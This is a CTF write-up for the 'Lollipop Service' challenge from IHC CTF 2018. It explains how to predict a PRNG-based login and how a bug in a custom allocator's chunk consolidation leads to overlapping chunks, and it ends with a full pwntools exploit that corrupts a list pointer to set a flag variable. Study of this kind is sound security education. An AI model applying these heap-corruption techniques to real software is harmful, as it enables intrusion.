---
layout: post
title: IHC CTF 2018 - The Lollipop Service
description: Writeup for challenge "The Lollipop Service" of IHC CTF 2018.
comments: true
---

From the 2nd to the 5th of August 2018, [Italian Hacker Camp](https://www.ihc.camp/) was held in Padova, Italy.
It was an amazing event - I highly recommend my Italian (and not!) fellows to participate.
As spritzers, we played and won the internal CTF.
Among the challenges I pwned, I particularly enjoyed "The Lollipop Service" - heap exploitation with a custom allocator.

You can grab the files [here](/assets/ctf/ihcctf18/the_lollipop_service.zip) if you want to play around with it.

### Overview

There are two files: `memalloc.so` (custom allocator library), and `the_lollipop_service` (actual challenge binary).
Both are 32-bit Linux ELFs, not stripped.
The allocator has partial RELRO and NX (plus, obviously, PIE).
The binary has partial RELRO, stack canaries, NX, but no PIE.

When executing the challenge (the allocator should be `LD_PRELOAD`ed), we get a question:

```
Before anythings else,
Tell me... who are you??
```

Let's try answering with my name... Nope.

```
---FATAL ERROR---
No no no, you are not Santa Claus!

NO CANDY FOR BAD BOYS! :'(
```

Okay, let's start reversing this.

### Getting past login

Login is handled by the function at 0x08048DB3.
It works like this:

```c
time_t t = time(0);
struct tm *tm = localtime(&t);

message("Before anythings else,");
message("Tell me... who are you??\n");

char buf[5];
memset(buf, 0, sizeof(buf));
if (!readInput(nptr, 5))
    exitOnError("Read error.. did you say somethings..?");
int x = atoi(buf);
if (!x)
    exitOnError((int)"No no no, you are not Santa Claus!");

srand(tm->tm_hour + x);
message("And now tell me your secret sequence!\n");
for (i = 0; i <= 99; i++) {
    if (!readInput(buf, 5))
        exitOnError("Read error.. did you say somethings..?");
    int val = rand() % 9999;
    if (val != atoi(buf))
        exitOnError("Wrong sequence!");
}
message("Good boy!");
```

So, it expects a number, which is summed with the hour part of the current local time, and the result is used as seed for the libc PRNG.
Then, the user must provide the first 100 numbers from the PRNG, modulo 9999.
Easy enough:

```python
from pwn import *
import ctypes
import datetime

context(os='linux', arch='i686')

libc = ctypes.CDLL('/lib64/libc.so.6')

p = process('./the_lollipop_service', env={'LD_PRELOAD': './memalloc.so'})

def login():
    p.recvuntil('you??\n')
    p.sendline('0001')
    p.recvuntil('sequence!\n')
    h = datetime.datetime.now().hour
    libc.srand(1 + h)
    for _ in range(100):
        x = libc.rand() % 9999
        p.sendline(str(x).zfill(4))

login()

p.interactive()
```

It doesn't matter which libc we use: the PRNG is always the same (LCG, `x(n+1) = 1103515245*x(n) + 12345 mod 2**31`), so I used my system's libc.
The challenge libc was not provided (altough we had it from previous exploits).
Also, note that I'm padding all inputs with zeroes to the buffer size minus one: the `readInput` function is slightly buggy (more on this later), padding avoided possible issues.

Finally we get a menu:

```
Good boy!

         _____ _                     
        |_   _| |__   ___            
          | | | '_ \ / _ \           
          | | | | | |  __/           
          |_| |_| |_|\___|           
  _          _ _ _                   
 | |    ___ | | (_)_ __   ___  _ __  
 | |   / _ \| | | | '_ \ / _ \| '_ \ 
 | |__| (_) | | | | |_) | (_) | |_) |
 |_____\___/|_|_|_| .__/ \___/| .__/ 
   ____           |_|    _    |_|    
  / ___|  ___ _ ____   _(_) ___ ___  
  \___ \ / _ \ '__\ \ / / |/ __/ _ \ 
   ___) |  __/ |   \ V /| | (_|  __/ 
  |____/ \___|_|    \_/ |_|\___\___| 
                                      

Welcome back, 1


Here's the list of available commands:

    help:        Print this help sreen
    add:        Place an order
    cart:        List the current order
    list:        List all the available candy
    remove:        Remove an order
    resel:        Print the flag
    quit:        Exit the program

Command>
```

Basically, we can enter orders for candies.
The orders are kept in a doubly-linked list with the following node structure:

```c
struct order {
    int id;
    int candy;
    struct order *prev;
    struct order *next;
    char note[];
};
```

A dummy order is kept in BSS as list head. The note is completely arbitrary.
While the prompt says it can be up to 16 bytes long, in reality it can be up to 1024.

One important command is `resel`: if the boolean flag `reseller` (at 0x0804B06C, in BSS) is truthy, it will print the flag (`system("cat /home/tlp/flag.txt")`).
However, there is no way to set the flag through normal program paths, so it must be our target for memory corruption.

### Auditing the challenge

I audited the challenge, but I wasn't able to find significant bugs.
The only one I found was in the `readInput` function:

```c
unsigned int readInput(char *buf, int size)
{
    char c; // [esp+Bh] [ebp-Dh]
    unsigned int i; // [esp+Ch] [ebp-Ch]

    i = 0;
    while (1) {
        c = getchar();
        if (c == '\n' || c == -1)
            break;
        if (size - 1 > i)
            buf[i++] = c;
    }
    buf[i + 1] = 0;
    return i;
}
```

This function always consumes the input up to the first newline, reading up to `size-1` bytes into `buf`.
Note that `buf[i++] = c` keeps the invariant that, at the end of an interation, `buf[i]` is the _next_ character to read.
Therefore, the final `buf[i + 1] = 0` will place the zero terminator one character beyond where it should be (i.e., the correct code would be `buf[i] = 0`).
This could cause issues if the buffer is not completely zeroed (reason why I'm padding all inputs).
Most importantly, there's an off-by-one overflow: if the input is `size-1` (or more) bytes long, we'll exit the loop with `i = size-1`, which will result in `buf[size] = 0`.
However, after examining usages, I was not able to find an exploitable condition.
All stack buffers had nothing interesting after them (they were just before canaries).
As for the heap, the order note was first read on the stack, its length was calculated and then a properly-sized order was allocated on the heap and the note copied into it.
Also, no usages allowed passing a zero `size` (which would cause an integer overflow in `if (size - 1 > i)` and allow arbitrary-size writes).

No luck auditing the challenge. The bug must be in the allocator, then...

### Auditing the allocator

The allocator exports `malloc` and `free`, along with `realloc`, `calloc` and `falloc` (which are trivially implemented on top of `malloc` and `free`).

The 16-byte chunk header is as follow:

```c
struct chunk {
    /* User data size, 16-byte aligned */
    int size;
    /* Free flag */
    int is_free;
    /* Chunk list, append on malloc */
    struct chunk *next;
    /* Padding */
    int field_C;
};
```

`malloc(size)` works as follows:

1. Round `size` up to a multiple of 16 bytes.
2. Scan the chunk list for a free chunk (`chunk->is_free == 1`) with `chunk->size >= size` (first-fit). If such a chunk is found, return `(char *)chunk + 16`.
3. Allocate a new chunk from the OS as `chunk = sbrk(size + 16)`. If it fails, return NULL.
4. Initialize `chunk->size = size`, `chunk->is_free = 0` and `chunk->next = NULL`.
5. Append the new chunk to the chunk list.
6. Return `(char *)chunk + 16`.

`free(ptr)` works as follows:

1. Let `struct chunk *chunk = (char *)ptr - 16`.
2. If `chunk` is the top chunk (`chunk == sbrk(0)`), remove the last chunk from the chunk list and give the memory back to the OS (`sbrk(-chunk->size - 16)`).
3. Otherwise, mark the chunk as free (`chunk->is_free = 1`) and call the `coalaising` (sic) routine to perform consolidation.

Note that since the chunk list is kept in memory order (append on `malloc`), the last chunk in the list will always be the top chunk, so step 2 is correct.

The consolidation process is best described by code:

```c
int coalaising(struct chunk *chunk)
{
    int num_chunks; // eax MAPDST

    if (!chunk->next)
        return 0;
    if (!chunk->next->is_free)
        return 1;
    if (chunk->next->size == chunk->size) {
        num_chunks = coalaising(chunk->next);
        chunk->size = (num_chunks + 1) * chunk->size + 16 * num_chunks;
        chunk->next = chunk->next->next;
        ++num_chunks;
    } else {
        chunk->size += chunk->next->size + 16;
        chunk->next = chunk->next->next;
        num_chunks = 2;
    }
    return num_chunks;
}
```

This performs recursive forward consolidation.
The function returns the number of consolidated chunks (0 for the top chunk, which is never consolidated, 1 if there was no consolidation, _n_ if _n_ chunks were consolidated).

First, it checks whether the size of the current chunk is the same as the next chunk's.
If it is, it will go on to recursively consolidate successive chunks.
Otherwise, it will consolidate by summing the size, plus 16 for the header, and updating the linked list accordingly.

The logic behind this is to consolidate runs of chunks of the same size, allowing also a final chunk of a different size.

The issue is that the recursive case doesn't take this final chunk into account.
Specifically, this is the problematic line:

```c
chunk->size = (num_chunks + 1) * chunk->size + 16 * num_chunks;
```

It assumes that all of the consolidated chunks have the same size (as the first chunk).
To see where this breaks, imagine having the following layout (with `n > m`):

```
| ALLOCATED (size n) | FREE (size n) | FREE (size m) |
```

We now free the first chunk in this sequence.
Since its size is equal to the second's size, `coalaising` will recurse.
Since the second chunk's size is not equal to the third's, the second and third will be consolidated (properly) in the `else` case, and the recursion will return `2`.
Then, the problematic line will update the first chunk's size to `3*n + 32`, which is bigger than the correct `2*n + m + 32`.

### Exploitation

To exploit the allocator, we can use a third chunk with a size smaller than the first and second chunk, and with another victim chunk allocated after it.
This way, we'll get a consolidated free chunk that overlaps the victim chunk.

The only kind of object that we can allocate in the challenge is the `struct order` shown earlier.
We can also free them at will.
Our goal is to set the `reseller` flag in BSS to something else than zero.

The only interesting thing we could do with the allocator bug is overlapping the controlled `note` from an order with another order's structure, to get control over a `struct order`.
To go from this to setting the flag, start by observing that when adding a new order the application traverses the order list to find the last item, and links the new order to it (i.e., `last_order->next = new_order`).
Since the `next` field is at offset 12 in `struct order`, interpreting the data at `reseller-12` as a `struct order` results in the `next` field overlapping with `reseller`.
Let's imagine having control over the currently last order's structure and setting its `next` to `reseller-12`.
When the application traverses the list, it will eventually get to the victim order, which links to `reseller-12`.
The order at `reseller-12` has a NULL `next` field (because `reseller` is zero), so the search will stop, having found `reseller-12` as the tail of the list.
Then, `last_order->next` (which is `reseller`) will be set to `new_order`.
Now `reseller` contains a pointer, which is not zero and therefore truthy!
That's the win we were looking for.

Let's calculate the chunk sizes we need.
We want to corrupt the `next` field in `struct order`.
Since `next` is 4 bytes at offset 12, we need a 16-byte overlap.
Like before, we assume two chunks of size _n_, followed by a chunk of size _m_, followed by the victim.
The final consolidated chunk will be `3*n + 32` bytes in size.
If we allocated an order in this free chunk, with the plan of using the controlled `note` to corrupt the victim order, what would the offset between `note` and the victim order be?
From the beginning of the chunk data, we want `2*n + m + 32` bytes to encompass the three chunks, plus 16 for the victim chunk header.
Since the note is at 16 bytes from the beginning of data, the offset from note to victim order is `2*n + m + 32`.
We want a 16-byte overlap, so the note length would have to be at least `2*n + m + 48`.
For an order, the application allocates 19 bytes + the string length of the note.
Therefore, the consolidated chunk has to be at least `2*n + m + 67` bytes.
Simplifying `3*n + 32 >= 2*n + m + 67` yields `n >= m + 35`.
The smallest allocation we can make is 32 bytes (note up to 13 bytes).
I decided to fix _m_ to 32, which gives 80 for _n_ (after 16-byte alignment).

Let's introduce a couple primitives for allocation/deallocation:

```python
def menu(choice):
    p.recvuntil('Command> ')
    p.sendline(choice)

def add_order(note):
    menu('add')
    p.recvuntil('want??')
    p.recvuntil('\n>')
    p.sendline('1')
    p.recvuntil('note (MAX 16 char):\n')
    p.sendline(note)

def remove_order(idx):
    menu('remove')
    p.recvuntil('remove?\n>')
    p.sendline(str(idx))
```

Before we start, remember that at the end we'll have to allocate an order to trigger the overwrite of `reseller`, after having extensively corrupted chunks near the top chunk.
I don't really want to allocate from the top chunk in that situation, so let's allocate an order which we'll free at the end to reallocate another order without touching the top chunk (comment is index and size):

```python
add_order('X') # 1, 0x20
```

We'll start by allocating our three chunks, followed by the victim chunk:

```python
add_order('A'*46) # 2, 0x50
add_order('B'*46) # 3, 0x50
add_order('C')    # 4, 0x20
add_order('V')    # 5, 0x20
```

Now the heap layout (ignoring X) is:

```
| A 0x50 | B 0x50 | C 0x20 | V 0x20 |
```

Since consolidation is only forward, deallocating B before C won't consolidate them:

```python
remove_order(3)
remove_order(4)
```

And we reach the desired layout:

```
| A 0x50 | B 0x50 FREE | C 0x20 FREE | V 0x20 |
```

Let's unleash the bug by deallocating A:

```python
remove_order(2)
```

Now the layout is:

```
+0x00: | 0x110 FREE |
+0xf0:         | V 0x20 |
```

Using the formulas we derived earlier with the chosen _n_ and _m_, we know the offset between the note and the victim order is 0xE0.
Time to corrupt the victim order:

```python
RESELLER = 0x0804b06c
fake_order = 'A'*12 + p32(RESELLER-12)
add_order('A'*0xe0 + fake_order)
```

Note that I'm replacing the whole chunk header and most of the order with As.
No need to bother with fake structs, it won't crash for now and we're almost done.
Just need to allocate an order to overwrite `reseller` (I'm reusing order 1 to avoid touching the top chunk):

```python
remove_order(1)
add_order('X')
```

Finally, let's get the flag:

```python
menu('resel')
p.interactive()
```

And it spits out `IHC{sw33t3r_th4n_c4ndy_0n_4_st1ck}`.
Good game!

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *
import ctypes
import datetime

context(os='linux', arch='i686')

libc = ctypes.CDLL('/lib64/libc.so.6')

p = process('./the_lollipop_service', env={'LD_PRELOAD': './memalloc.so'})

def login():
    p.recvuntil('you??\n')
    p.sendline('0001')
    p.recvuntil('sequence!\n')
    h = datetime.datetime.now().hour
    libc.srand(1 + h)
    for _ in range(100):
        x = libc.rand() % 9999
        p.sendline(str(x).zfill(4))

def menu(choice):
    p.recvuntil('Command> ')
    p.sendline(choice)

def add_order(note):
    menu('add')
    p.recvuntil('want??')
    p.recvuntil('\n>')
    p.sendline('1')
    p.recvuntil('note (MAX 16 char):\n')
    p.sendline(note)

def remove_order(idx):
    menu('remove')
    p.recvuntil('remove?\n>')
    p.sendline(str(idx))

login()

add_order('X') # 1, 0x20

add_order('A'*46) # 2, 0x50
add_order('B'*46) # 3, 0x50
add_order('C')    # 4, 0x20
add_order('V')    # 5, 0x20

remove_order(3)
remove_order(4)
remove_order(2) # overlapping consolidation

RESELLER = 0x0804b06c
fake_order = 'A'*12 + p32(RESELLER-12)
add_order('A'*0xe0 + fake_order)

remove_order(1)
add_order('X')

menu('resel')
p.interactive()
```
